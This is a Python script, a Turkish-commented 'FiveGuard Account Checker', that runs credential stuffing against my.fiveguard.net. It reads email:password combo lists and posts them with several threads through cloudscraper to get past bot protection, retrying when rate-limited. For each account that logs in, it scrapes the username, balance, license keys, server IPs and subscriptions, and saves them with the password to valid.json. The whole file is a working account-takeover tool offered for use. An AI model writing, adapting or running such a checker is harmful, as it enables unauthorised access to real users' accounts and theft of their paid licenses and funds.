#!/usr/bin/env python3
"""
FiveGuard Account Checker [ULTRATHINK EDITION]
Kynarix Production - Twixx Exclusive
"""

from datetime import datetime
from colorama import init, Fore, Style
import random
import threading
import time
import sys
import os
import json
import shutil
import ctypes
from lxml import etree
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.layout import Layout
from rich.table import Table
from rich.columns import Columns
from rich.progress import ProgressBar
from rich.text import Text
from rich.align import Align

THREADS = 5
ACCOUNTS_FILE = "accounts.txt"
RESULTS_DIR = "results"
BASE_URL = "https://my.fiveguard.net"
LOGIN_URL = f"{BASE_URL}/login"

init(autoreset=True)

RED_BOLD = "bold #E53935"
WHITE_BOLD = "bold #FAFAFA"
GREY = "#757575"
GREEN_BOLD = "bold #4CAF50"
YELLOW_BOLD = "bold #FF9800"
CYAN_BOLD = "bold #2196F3"

ctypes.windll.kernel32.SetConsoleTitleW("FiveGuard Checker & By Kynarix")

class DisplayManager:
    def __init__(self, checker):
        self.checker = checker
        self.console = Console()
        self.live = None

    def create_dashboard(self):
        stats = self.checker.stats
        checked = stats["Checked"]
        total = stats["Total"]
        percent = (checked / total * 100) if total > 0 else 0

        prog = ProgressBar(total=total, completed=checked, width=60, style="#424242", complete_style="#E53935", finished_style=GREEN_BOLD)
        
        table = Table(box=None, padding=(0, 2), show_header=False)
        table.add_column("Key", style=WHITE_BOLD, justify="right")
        table.add_column("Val", justify="left")
        table.add_column("Sep", style=GREY)
        table.add_column("Key2", style=WHITE_BOLD, justify="right")
        table.add_column("Val2", justify="left")

        table.add_row("Valid", f"[#4CAF50]{stats['Valid']}[/]", "|", "Balance", f"[#FF9800]{stats['TotalBalance']}[/]")
        table.add_row("Invalid", f"[#E53935]{stats['Invalid']}[/]", "|", "Products", f"[#2196F3]{stats['TotalProducts']}[/]")
        table.add_row("Error", f"[#FF9800]{stats['Error']}[/]", "|", "Checked", f"{checked} / {total}")

        logs_text = Text()
        with self.checker.lock:
            for log in self.checker.logs[-8:]:
                highlighted_log = log
                if "[VALID]" in log: highlighted_log = f"[#4CAF50]{log}[/]"
                elif "[INVALID]" in log: highlighted_log = f"[#E53935]{log}[/]"
                elif "[ERROR]" in log: highlighted_log = f"[#E53935]{log}[/]"
                elif "[RETRY]" in log: highlighted_log = f"[#FF9800]{log}[/]"
                logs_text.append("» ", style=RED_BOLD)
                logs_text.append(Text.from_markup(highlighted_log))
                logs_text.append("\n")

        content = Align.center(
            Panel(
                Align.center(
                    Columns([
                        Align.center(Text(f"\nFIVEGUARD CHECKER v1.1 - KYNARIX\n", style=RED_BOLD)),
                        Align.center(prog),
                        Align.center(Text(f"{percent:.2f}%\n", style=WHITE_BOLD)),
                        Align.center(table),
                        Align.center(Text(f"\nThreads: {THREADS} | Target: my.fiveguard.net | Out: valid.json\n", style=GREY)),
                        Text(f"LAST ACTIONS:\n", style=RED_BOLD),
                        logs_text
                    ], align="center")
                ),
                border_style=RED_BOLD,
                width=100,
                padding=(1, 2)
            )
        )
        return content

    def start(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.live = Live(self.create_dashboard(), console=self.console, refresh_per_second=4, screen=False)
        self.live.start()

    def update(self):
        if self.live:
            self.live.update(self.create_dashboard())

    def stop(self):
        if self.live:
            self.live.stop()

class FiveGuardChecker:
    def __init__(self):
        self.stats = {
            "Valid": 0, "Invalid": 0, "Error": 0, 
            "Total": 0, "Checked": 0, "TotalProducts": 0, "TotalBalance": 0
        }
        self.lock = threading.Lock()
        self.logs = []
        self.display = DisplayManager(self)
        self._ensure_directories()
        self.json_file = os.path.join(RESULTS_DIR, "valid.json")
        self._init_json()
        self.stop_event = threading.Event()

    def _init_json(self):
        with self.lock:
            # Sadece varlığı değil, içindeki veriyi de garanti alalım amk
            if not os.path.exists(self.json_file) or os.path.getsize(self.json_file) == 0:
                with open(self.json_file, "w") as f:
                    json.dump([], f)
        
    def _ensure_directories(self):
        if not os.path.exists(RESULTS_DIR):
            os.makedirs(RESULTS_DIR)

    def _log_action(self, msg):
        with self.lock:
            self.logs.append(msg)
            if len(self.logs) > 20:
                self.logs.pop(0)

    def _log(self, status, email, extra=""):
        msg = f"[{status}] {email} {extra}"
        self._log_action(msg)
        self.display.update()

    def _get_scraper(self):
        import cloudscraper
        scraper = cloudscraper.create_scraper(
            browser={'browser': 'firefox', 'platform': 'windows', 'mobile': False}
        )
        scraper.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0",
            "Accept": "*/*",
            "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-GPC": "1",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Priority": "u=0",
            "Referer": "https://my.fiveguard.net/",
            "Origin": "https://my.fiveguard.net"
        })
        return scraper

    def check_account(self, email, password):
        if self.stop_event.is_set(): return
        scraper = self._get_scraper()
        data = {
            "email": email,
            "pass": password,
            "remember_me": "false"
        }
        
        max_retries = 3
        for attempt in range(max_retries):
            if self.stop_event.is_set(): return
            try:
                response = scraper.post(
                    LOGIN_URL,
                    data=data,
                    timeout=20
                )
                
                if response.status_code == 429:
                    wait_time = (attempt + 1) * 30
                    #self._log("LIMIT", email, f"Rate limited. Sleeping {wait_time}s...")
                    time.sleep(wait_time)
                    continue

                if response.status_code in [200, 302]:
                    resp_text = response.text.strip().lower()
                    resp_json = {}
                    try:
                        if "application/json" in response.headers.get("Content-Type", ""):
                            resp_json = response.json()
                    except:
                        pass
                    
                    # Geniş kontrol - done, success, redirect veya JSON'da success:true
                    is_valid = (
                        "done" in resp_text or 
                        resp_json.get("success") == True or 
                        resp_json.get("success") == "true" or
                        "redirect" in resp_json or
                        resp_json.get("status") == "success" or
                        (resp_text == "" and response.status_code == 200)  # Boş response = başarılı olabilir
                    )
                    
                    if is_valid:
                        time.sleep(1)
                        cap_data = self._capture_data(scraper)
                        self._update_stats("Valid", cap_data)
                        self._log("VALID", email, f"| {cap_data['username']} | {cap_data['balance']} | {len(cap_data['owned_products'])} Owned | {len(cap_data['active_subscriptions'])} Subs")
                        self._save_json(email, password, cap_data)
                        return

                    if resp_json:
                        error_msg = resp_json.get("message", "").lower()
                        if any(x in error_msg for x in ["invalid", "incorrect", "wrong"]):
                            self._update_stats("Invalid")
                            self._log("INVALID", email)
                            return
                    
                    if response.status_code == 302 and "login" not in response.headers.get("Location", ""):
                        cap_data = self._capture_data(scraper)
                        self._update_stats("Valid", cap_data)
                        self._log("VALID", email, f"| {cap_data['username']} | {cap_data['balance']} | {len(cap_data['owned_products'])} Owned | {len(cap_data['active_subscriptions'])} Subs")
                        self._save_json(email, password, cap_data)
                        return

                    self._update_stats("Invalid")
                    self._log("INVALID", email)
                    return

                elif response.status_code == 422:
                    self._update_stats("Invalid")
                    self._log("INVALID", email)
                    return

                elif response.status_code >= 500:
                    wait_time = (attempt + 1) * 10
                    self._log("RETRY", email, f"Server Error {response.status_code}. Retrying...")
                    time.sleep(wait_time)
                    continue

                else:
                    self._update_stats("Error")
                    self._log("ERROR", email, f"Status: {response.status_code}")
                    return

            except Exception as e:
                if attempt == max_retries - 1:
                    self._update_stats("Error")
                    self._log("ERROR", email, str(e))
                time.sleep(5)

    def _capture_data(self, scraper):
        results = {"username": "N/A", "balance": "N/A", "account_type": "N/A", "owned_products": [], "active_subscriptions": []}
        
        def safe_get(url, retry=True):
            if self.stop_event.is_set(): return None
            time.sleep(random.uniform(0.1, 0.3))
            if self.stop_event.is_set(): return None
            try:
                resp = scraper.get(url, timeout=30)
                if resp.status_code in [403, 429] and retry:
                    #self._log("DEBUG", "Capture", f"Rate limited/Blocked on {url.split('/')[-1]}. Retrying in 10s...")
                    time.sleep(10)
                    return safe_get(url, retry=False)
                return resp
            except:
                return None

        try:
            set_resp = safe_get(f"{BASE_URL}/user/settings")
            if set_resp and set_resp.status_code == 200:
                tree = etree.HTML(set_resp.text)
                username_xpath = "/html/body/div[1]/div[2]/div/nav/div/ul/li[2]/a/div/span/strong"
                balance_xpath = "/html/body/div[1]/div[2]/div/nav/div/ul/li[1]/a/div"
                acc_type_xpath = "/html/body/div[1]/div[5]/div/div[2]/div[2]/div/div[2]/div[2]/h4[3]"
                
                username = tree.xpath(username_xpath)
                balance = tree.xpath(balance_xpath)
                acc_type = tree.xpath(acc_type_xpath)
                
                results["username"] = username[0].text.strip() if username and hasattr(username[0], 'text') else "N/A"
                results["balance"] = "".join([t.strip() for t in tree.xpath(f"{balance_xpath}//text()") if t.strip()]) if balance else "N/A"
                results["account_type"] = "".join([t.strip() for t in tree.xpath(f"{acc_type_xpath}//text()") if t.strip()]) if acc_type else "N/A"

            dash_resp = safe_get(f"{BASE_URL}/user/dashboard")
            if dash_resp and dash_resp.status_code == 200:
                tree = etree.HTML(dash_resp.text)
                
                # Owned Products (eski products)
                owned_rows = tree.xpath("//table[@id='owned_products']//tr[td]")
                if not owned_rows:
                    owned_rows = tree.xpath("//h4[contains(text(), 'Owned Products')]/ancestor::div[contains(@class, 'card')]//table//tr[td]")

                for row in owned_rows:
                    tds = row.xpath("./td")
                    if len(tds) >= 4:
                        license_val = " ".join([t.strip() for t in tds[0].xpath(".//text()") if t.strip()])
                        ip_val = " ".join([t.strip() for t in tds[1].xpath(".//text()") if t.strip()])
                        date_val = " ".join([t.strip() for t in tds[2].xpath(".//text()") if t.strip()])
                        len_val = " ".join([t.strip() for t in tds[3].xpath(".//text()") if t.strip()])
                        
                        if license_val and license_val != "License":
                            results["owned_products"].append({
                                "license": license_val,
                                "ip": ip_val,
                                "bought_date": date_val,
                                "length": len_val
                            })
                
                # Active Subscriptions (yeni özellik) - Daha generic XPath
                # "Active Subscriptions" başlığını bul ve ona en yakın tabloyu çek
                sub_tables = tree.xpath("//h4[contains(text(), 'Active Subscriptions')]/following::table[1]//tr")
                if not sub_tables:
                    # Alternatif: class veya id ile bul
                    sub_tables = tree.xpath("//table[contains(@class, 'subscription') or contains(@id, 'subscription')]//tr[td]")
                if not sub_tables:
                    # Son çare: Tüm tabloları kontrol et ve Active Subscriptions olanı bul
                    all_tables = tree.xpath("//div[contains(@class, 'card')]")
                    for card in all_tables:
                        card_title = card.xpath(".//h4/text()")
                        if card_title and "Active Subscriptions" in "".join(card_title):
                            sub_tables = card.xpath(".//table//tr[td]")
                            break
                
                for row in sub_tables:
                    tds = row.xpath("./td")
                    if len(tds) >= 4:
                        # Her td içindeki text'i çek (h4 veya direkt text olabilir)
                        license_val = " ".join([t.strip() for t in tds[0].xpath(".//text()") if t.strip()])
                        ip_val = " ".join([t.strip() for t in tds[1].xpath(".//text()") if t.strip()])
                        time_remaining_val = " ".join([t.strip() for t in tds[2].xpath(".//text()") if t.strip()])
                        expires_val = " ".join([t.strip() for t in tds[3].xpath(".//text()") if t.strip()])
                        
                        # Header satırını atla
                        if license_val and license_val.lower() not in ["license", "licence"]:
                            results["active_subscriptions"].append({
                                "license": license_val,
                                "ip_address": ip_val,
                                "time_remaining": time_remaining_val,
                                "expires_on": expires_val
                            })
        except Exception as e:
            self._log("DEBUG", "Multi-Capture", f"Error: {str(e)}")
            
        return results

    def _save_json(self, email, password, cap_data):
        with self.lock:
            try:
                data = []
                if os.path.exists(self.json_file) and os.path.getsize(self.json_file) > 0:
                    try:
                        with open(self.json_file, "r") as f:
                            data = json.load(f)
                    except json.JSONDecodeError:
                        data = [] # Bozuk dosyayı sıfırla amk

                data.append({
                    "email": email,
                    "password": password,
                    "username": cap_data["username"],
                    "balance": cap_data["balance"],
                    "account_type": cap_data["account_type"],
                    "owned_products": cap_data["owned_products"],
                    "active_subscriptions": cap_data["active_subscriptions"],
                    "checker": "Kynarix"
                })
                
                with open(self.json_file, "w") as f:
                    json.dump(data, f, indent=4)
            except Exception as e:
                self._log("DEBUG", "JSON-Save", f"Error: {str(e)}")

    def _update_stats(self, key, cap_data=None):
        with self.lock:
            self.stats[key] += 1
            if key == "Valid":
                self.stats["Checked"] += 1
                if cap_data:
                    self.stats["TotalProducts"] += len(cap_data.get("owned_products", [])) + len(cap_data.get("active_subscriptions", []))
                    try:
                        balance_str = cap_data.get("balance", "0")
                        val = int(''.join(filter(str.isdigit, balance_str))) if any(c.isdigit() for c in balance_str) else 0
                        self.stats["TotalBalance"] += val
                    except:
                        pass
            elif key == "Invalid":
                self.stats["Checked"] += 1

    def _save_valid(self, combo):
        pass

    def _load_accounts(self):
        if not os.path.exists(ACCOUNTS_FILE):
            return []
        with open(ACCOUNTS_FILE, "r") as f:
            return [line.strip() for line in f if ":" in line]

    def run(self):
        accounts = self._load_accounts()
        if not accounts:
            print(f"{Fore.RED}[!] No accounts found in {ACCOUNTS_FILE}")
            return

        self.stats["Total"] = len(accounts)
        self.display.start()
        
        executor = ThreadPoolExecutor(max_workers=THREADS)
        try:
            futures = [executor.submit(self.check_account, *c.split(":", 1)) for c in accounts if ":" in c]
            while any(not f.done() for f in futures):
                if self.stop_event.is_set(): break
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop_event.set()
            executor.shutdown(wait=False, cancel_futures=True)
            self._log("STOP", "SYSTEM", "Kullanıcı durdurdu!")
        finally:
            self.display.stop()
            executor.shutdown(wait=False)
            print(f"\n{Fore.GREEN}[+] İşlem tamamlandı/durduruldu. Sonuçlar {self.json_file} dosyasında!")

if __name__ == "__main__":
    checker = FiveGuardChecker()
    checker.run()
